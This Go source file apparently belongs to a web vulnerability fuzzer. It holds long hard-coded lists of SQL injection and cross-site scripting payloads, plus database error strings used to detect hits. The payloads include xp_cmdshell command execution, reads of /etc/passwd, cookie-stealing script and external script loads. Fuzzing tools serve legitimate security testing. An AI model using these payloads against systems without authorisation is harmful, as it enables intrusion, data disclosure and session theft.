package fuzzer

import (
	"strconv"
	"github.com/pkg/errors"
	"log"
	"strings"
	"os"
	"bufio"
	"path/filepath"
)

type Vulnerability struct{
	Type string
	Payloads []string
	Detector []string
}

func (v *Vulnerability) CustomPayload(filePath string) error{

	var line string

	if _, err := os.Stat(filePath); err != nil{
		return errors.New("Fuzzing type do not exist.")
	}

	dir := filepath.Dir(filePath)
	if _, err := os.Stat(dir + "/detector.txt"); err != nil{
		return errors.New("Fuzzing type do not exist.")
	}

	file, err := os.OpenFile(filePath,os.O_RDONLY, 755)
	if err != nil{
		return errors.New("error when opening : " + err.Error())
	}

	reader := bufio.NewReader(file)
	for{
		line, err = reader.ReadString('\n')
		v.Payloads = append(v.Payloads, strings.TrimSpace(line))
		if err != nil {
			break
			}
	}
	log.Println(strconv.Itoa(len(v.Payloads)) + " payloads loaded.")

	file, err = os.OpenFile(dir + "/detector.txt",os.O_RDONLY, 755)
	if err != nil{
		return errors.New("error when opening : " + err.Error())
	}

	reader = bufio.NewReader(file)
	for{
		line, err = reader.ReadString('\n')
		v.Detector = append(v.Detector, strings.TrimSpace(line))
		if err != nil {
			break
		}
	}
	return nil
}

func (v *Vulnerability) LoadPayload() error{
	payloadAvailable := []string{
		"xss",
		"sql",
		"python",
	}
	FindPayload := false
	for _, payload := range payloadAvailable{
		if strings.ToLower(v.Type) == payload{
			FindPayload = true
		}
	}
	if FindPayload == false{
		return errors.New("Fuzzing type do not exist.")
	}

	payloadList := v.GetLine()

	for _, line := range payloadList{
		v.Payloads = append(v.Payloads, strings.TrimSpace(line))
	}

	log.Println(strconv.Itoa(len(v.Payloads)) + " payloads loaded.")

	detectorList := v.GetDetector()

	for _, line := range detectorList{
		v.Detector = append(v.Detector, strings.TrimSpace(line))
	}

	log.Println(strconv.Itoa(len(v.Detector)) + " detectors loaded.")
	return nil
}

func (v *Vulnerability) GetDetector() []string{
	t := strings.ToLower(v.Type)
	if t == "sql"{
		return v.GetSQLDetector()
	} else if t == "xss"{
		return v.GetXSSDetector()
	} else if t == "python"{
		return v.GetPythonErrorDetector()
	}
	return []string{}
}

func (v *Vulnerability) GetLine() []string{
	t := strings.ToLower(v.Type)
	if t == "sql"{
		return v.GetSQL()
	} else if t == "xss"{
		return v.GetXSS()
	} else if t == "python"{
		return v.GetPythonError()
	}
	return []string{}
}

func (v *Vulnerability) GetSQLDetector() []string{
	return []string{
		"&lt;/font&gt;&lt;font face=\"Arial\" size=2&gt;",
		"A syntax error has occurred",
		"ADODB.Field error",
		"ASP.NET is configured to show verbose error messages",
		"ASP.NET_SessionId",
		"Active Server Pages error",
		"An illegal character has been found in the statement",
		"An unexpected token \"END-OF-STATEMENT\" was found",
		"CLI Driver",
		"Can't connect to local",
		"Custom Error Message",
		"DB2 Driver",
		"DB2 Error",
		"DB2 ODBC",
		"Died at",
		"Disallowed Parent Path",
		"Error Diagnostic Information",
		"Error Message : Error loading required libraries.",
		"Error Report",
		"Error converting data type varchar to numeric",
		"Fatal error",
		"Incorrect syntax near",
		"Index of",
		"Internal Server Error",
		"Invalid Path Character",
		"Invalid procedure call or argument",
		"Invision Power Board Database Error",
		"JDBC Driver",
		"JDBC Error",
		"JDBC MySQL",
		"JDBC Oracle",
		"JDBC SQL",
		"Microsoft OLE DB Provider for ODBC Drivers",
		"Microsoft VBScript compilation error",
		"Microsoft VBScript error",
		"MySQL Driver",
		"MySQL Error",
		"MySQL ODBC",
		"ODBC DB2",
		"ODBC Driver",
		"ODBC Error",
		"ODBC Microsoft Access",
		"ODBC Oracle",
		"ODBC SQL",
		"ODBC SQL Server",
		"OLE/DB provider returned message",
		"ORA-0",
		"ORA-1",
		"Oracle DB2",
		"Oracle Driver",
		"Oracle Error",
		"Oracle ODBC",
		"PHP Error",
		"PHP Parse error",
		"PHP Warning",
		"Parent Directory",
		"Permission denied: 'GetObject'",
		"PostgreSQL query failed: ERROR: parser: parse error",
		"SQL Server Driver",
		"SQL Server",
		"SQL command not properly ended",
		"SQLException",
		"Supplied argument is not a valid PostgreSQL result",
		"Syntax error in query expression",
		"The error occurred in",
		"The script whose uid is",
		"Type mismatch",
		"Unable to jump to row",
		"Unclosed quotation mark before the character string",
		"Unterminated string constant",
		"Warning: Cannot modify header information - headers already sent",
		"Warning: Supplied argument is not a valid File-Handle resource in",
		"Warning: mysql_query()",
		"Warning: pg_connect(): Unable to connect to PostgreSQL server: FATAL",
		"You have an error in your SQL syntax near",
		"data source=",
		"detected an internal error [IBM][CLI Driver][DB2/6000]",
		"include_path",
		"invalid query",
		"is not allowed to access",
		"mySQL error with query",
		"mysql error",
		"on MySQL result index",
		"server object error",
		"supplied argument is not a valid MySQL result resource",
		"unexpected end of SQL command",
		"MySQL server version",
		"You have an error in your SQL syntax",
		"SQL syntax",
	}
}

func (v *Vulnerability) GetSQL() []string{
	return []string{
		"'",
		"' --",
		"(",
		")",
		"*|",
		"*/*",
		"&",
		"0",
		"031003000270000",
		"0 or 1=1",
		"0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)",
		"0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A",
		"0x77616974666F722064656C61792027303A303A31302700 exec(@s)",
		"1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;",
		"1 or 1=1",
		"1;SELECT%20*",
		"1 waitfor delay '0:0:10'--",
		"'%20or%20''='",
		"'%20or%201=1",
		"')%20or%20('x'='x",
		"'%20or%20'x'='x",
		"%20or%20x=x",
		"%20'sleep%2050'",
		"%20$(sleep%2050)",
		"%21",
		"23 OR 1=1",
		"hi' or '1'='1'--",
		"%26",
		"%27%20or%201=1",
		"%28",
		"%29",
		"%2A%28%7C%28mail%3D%2A%29%29",
		"%2A%28%7C%28objectclass%3D%2A%29%29",
		"%2A%7C",
		"||6",
		"'||'6",
		"(||6)",
		"%7C",
		"a'",
		"admin' or '",
		"' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));",
		"' and 1 in (select var from temp)--",
		"anything' OR 'x'='x",
		"a' or 1=1--",
		"a' or 3=3--",
		"a' or 'a' = 'a",
		"&apos;%20OR",
		"as",
		"asc",
		"a' waitfor delay '0:0:10'--",
		"'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >",
		"bfilename",
		"char%4039%41%2b%40SELECT",
		"delete",
		"desc",
		"distinct",
		"'||(elt(-3+5,bin(15),ord(10),hex(char(45))))",
		"'; exec master..xp_cmdshell",
		"'; exec master..xp_cmdshell 'ping 172.10.1.255'--",
		"exec(@s)",
		"'; exec ('sel' + 'ect us' + 'er')",
		"exec sp",
		"'; execute immediate 'sel' || 'ect us' || 'er'",
		"exec xp",
		"'; exec xp_regread",
		"' group by userid having 1=1--",
		"handler",
		"having",
		"' having 1=1--",
		"hi' or 1=1 --",
		"hi or a=a",
		"hi' or 'a'='a",
		"hi') or ('a'='a",
		"'hi' or 'x'='x';",
		"insert",
		"like",
		"limit",
		"*(|(mail=*))",
		"*(|(objectclass=*))",
		"or",
		"' or ''='",
		"' or 0=0 --",
		"' or 0=0 #",
		"\" or 0=0 --",
		"or 0=0 --",
		"or 0=0 #",
		"' or 1 --'",
		"' or 1/*",
		"; or '1'='1'",
		"' or '1'='1",
		"' or '1'='1'--",
		"' or 1=1",
		"' or 1=1 /*",
		"' or 1=1--",
		"' or 1=1--",
		"'/**/or/**/1/**/=/**/1",
		"‘ or 1=1 --",
		"\" or 1=1--",
		"or 1=1",
		"or 1=1--",
		"' or 1=1 or ''='",
		"' or 1 in (select @@version)--",
		"or%201=1",
		"or%201=1 --",
		"' or 2 > 1",
		"' or 2 between 1 and 3",
		"' or 3=3",
		"‘ or 3=3 --",
		"' or '7659'='7659",
		"or a=a",
		"or a = a",
		"' or 'a'='a",
		"' or a=a--",
		"') or ('a'='a",
		") or (a=a",
		"order by",
		"' or (EXISTS)",
		"or isNULL(1/0) /*",
		"\" or isNULL(1/0) /*",
		"' or 'something' like 'some%'",
		"' or 'something' = 'some'+'thing'",
		"' or 'text' = n'text'",
		"' or 'text' > 't'",
		"' or uid like '%",
		"' or uname like '%",
		"' or 'unusual' = 'unusual'",
		"' or userid like '%",
		"' or user like '%",
		"' or username like '%",
		"' or username like char(37);",
		"' or 'whatever' in ('whatever')",
		"' -- &password=",
		"password:*/=1--",
		"PRINT",
		"PRINT @@variable",
		"procedure",
		"replace",
		"select",
		"' select * from information_schema.tables--",
		"' select name from syscolumns where id = (select id from sysobjects where name = tablename')--",
		"' (select top 1",
		"--sp_password",
		"'sqlattempt1",
		"(sqlattempt2)",
		"'sqlvuln",
		"'+sqlvuln",
		"(sqlvuln)",
		"sqlvuln;",
		"t'exec master..xp_cmdshell 'nslookup www.google.com'--",
		"to_timestamp_tz",
		"truncate",
		"tz_offset",
		"' UNION ALL SELECT",
		"' union all select @@version--",
		"' union select",
		"uni/**/on sel/**/ect",
		"' UNION SELECT",
		"' union select 1,load_file('/etc/passwd'),1,1,1;",
		") union select * from information_schema.tables;",
		"' union select * from users where login = char(114,111,111,116);",
		"update",
		"'||UTL_HTTP.REQUEST",
		",@variable",
		"@variable",
		"@var select @var as var into temp end --",
		"\x27UNION SELECT",
		"x' AND 1=(SELECT COUNT(*) FROM tabname); --",
		"x' AND email IS NULL; --",
		"x' AND members.email IS NULL; --",
		"x' AND userid IS NULL; --",
		"x' or 1=1 or 'x'='y",
		"x' OR full_name LIKE '%Bob%",
		"ý or 1=1 --",
		"1'1",
		"1 exec sp_ (or exec xp_)",
		"1 and 1=1",
		"1' and 1=(select count(*) from tablenames); --",
		"1 or 1=1",
		"1' or '1'='1",
		"1or1=1",
		"1'or'1'='1",
		"fake@ema'or'il.nl'='il.nl",
	}
}

func (v *Vulnerability) GetXSSDetector() []string{
	return []string{
		"' onmouseover=alert(/Black.Spook/)",
		"\";eval(unescape(location))//#  %0Aalert(0)",
		"\"><BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
		"\"><iframe%20src=\"http://google.com\"%%203E",
		"\"><img src=x onerror=prompt(1);>",
		"&lt;IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
		"&lt;SCRIPT SRC=//xss.rocks/.j>",
		"'); alert('XSS",
		"\"><script>alert(1)</script>",
		"\";alert('XSS');//",
		"<%<!--'%><script>alert(1);</script -->",
		"<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>",
		"<--`<img/src=` onerror=alert(1)> --!>",
		"<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>",
		"<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
		"<a  href=\"data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203\">Click  Me</a>",
		"<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe",
		"<a href=\"data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>\">X</a",
		"<a href=\"javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;\"><button>",
		"<a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X</a>",
		"<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>",
		"<a onmouseover=\"alert(document.cookie)\">xxs link</a>",
		"<a onmouseover=alert(document.cookie)>xxs link</a>",
		"<iframe/onreadystatechange=alert(1)",
		"<iframe/src \\/\\/onload = prompt(1)",
		"<IMG DYNSRC=\"javascript:alert('XSS')\">",
		"<IMG onmouseover=\"alert('xxs')\">",
		"<img src ?itworksonchrome?\\/onerror = alert(1)???",
		"<IMG SRC= onmouseover=\"alert('xxs')\">",
		"<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
		"<img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">",
		"<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
		"<IMG SRC=\"jav&amp;#x09;ascript:alert('XSS');\">",
		"<IMG SRC=\"jav&amp;#x0A;ascript:alert('XSS');\">",
		"<IMG SRC=\"jav&amp;#x0D;ascript:alert('XSS');\">",
		"<IMG SRC=\"javascript:alert('XSS')\"",
		"<img src=\"javascript:alert('XSS')\">",
		"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
		"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
		"<img src=`xx:xx`onerror=alert(1)>",
		"<svg contentScriptType=text/vbs><script>MsgBox+1",
		"<svg/onload=alert(1)",
		"<svg><script ?>alert(1)",
		"<svg><script onlypossibleinopera:-)> alert(1)",
		"<svg><script>//&NewLine;confirm(1);</script </svg>",
		"<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>",
		"<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\\/script%26gt;\\%26quot;%26quot;) autofocus></textarea>",
		"<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>",
		"<var onmouseover=\"prompt(1)\">On Mouse Over</var>?",
		"http://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/test.xxe",
		"http://www.<script>alert(1)</script .com",
		"https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/test.xxe",
		"javascript:alert%28/xss/%29",
		"javascript:alert(1)",
		"PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
		"x”</title><img src%3dx onerror%3dalert(1)>",
		"[[#%3Cscript%3Ealert(1)%3C/script%3E|",
	}
}

func (v *Vulnerability) GetXSS() []string{
	return []string{
		"' onmouseover=alert(/Black.Spook/)",
		"\";eval(unescape(location))//#  %0Aalert(0)",
		"\"><BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
		"\"><iframe%20src=\"http://google.com\"%%203E",
		"\"><img src=x onerror=prompt(1);>",
		"&lt;IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
		"&lt;SCRIPT SRC=//xss.rocks/.j>",
		"'); alert('XSS",
		"\"><script>alert(1)</script>",
		"\";alert('XSS');//",
		"<%<!--'%><script>alert(1);</script -->",
		"<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>",
		"<--`<img/src=` onerror=alert(1)> --!>",
		"<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>",
		"<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
		"<a  href=\"data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203\">Click  Me</a>",
		"<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe",
		"<a href=\"data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>\">X</a",
		"<a href=\"javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;\"><button>",
		"<a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X</a>",
		"<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>",
		"<a onmouseover=\"alert(document.cookie)\">xxs link</a>",
		"<a onmouseover=alert(document.cookie)>xxs link</a>",
		"<iframe/onreadystatechange=alert(1)",
		"<iframe/src \\/\\/onload = prompt(1)",
		"<IMG DYNSRC=\"javascript:alert('XSS')\">",
		"<IMG onmouseover=\"alert('xxs')\">",
		"<img src ?itworksonchrome?\\/onerror = alert(1)???",
		"<IMG SRC= onmouseover=\"alert('xxs')\">",
		"<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
		"<img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">",
		"<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
		"<IMG SRC=\"jav&amp;#x09;ascript:alert('XSS');\">",
		"<IMG SRC=\"jav&amp;#x0A;ascript:alert('XSS');\">",
		"<IMG SRC=\"jav&amp;#x0D;ascript:alert('XSS');\">",
		"<IMG SRC=\"javascript:alert('XSS')\"",
		"<img src=\"javascript:alert('XSS')\">",
		"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
		"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
		"<img src=`xx:xx`onerror=alert(1)>",
		"<svg contentScriptType=text/vbs><script>MsgBox+1",
		"<svg/onload=alert(1)",
		"<svg><script ?>alert(1)",
		"<svg><script onlypossibleinopera:-)> alert(1)",
		"<svg><script>//&NewLine;confirm(1);</script </svg>",
		"<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>",
		"<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\\/script%26gt;\\%26quot;%26quot;) autofocus></textarea>",
		"<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>",
		"<var onmouseover=\"prompt(1)\">On Mouse Over</var>?",
		"http://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/test.xxe",
		"http://www.<script>alert(1)</script .com",
		"https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/test.xxe",
		"javascript:alert%28/xss/%29",
		"javascript:alert(1)",
		"PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
		"x”</title><img src%3dx onerror%3dalert(1)>",
		"[[#%3Cscript%3Ealert(1)%3C/script%3E|",
	}
}

func (v *Vulnerability) GetPythonError() []string{
	return []string{
		"1234567890",
		"[]'",
		"[]",
		"{}",
		"---",
		"1'",
		"<>",
		"'''''\"",
		"\\",
		"/",
	}
}

func (v *Vulnerability) GetPythonErrorDetector() []string{
	return []string{
		"SyntaxError:",
		"IndentationError:",
		"TypeError:",
		"NameError:",
		"AttributeError:",
		"IndexError:",
		"KeyError:",
		"UnboundLocalError:",
	}
}
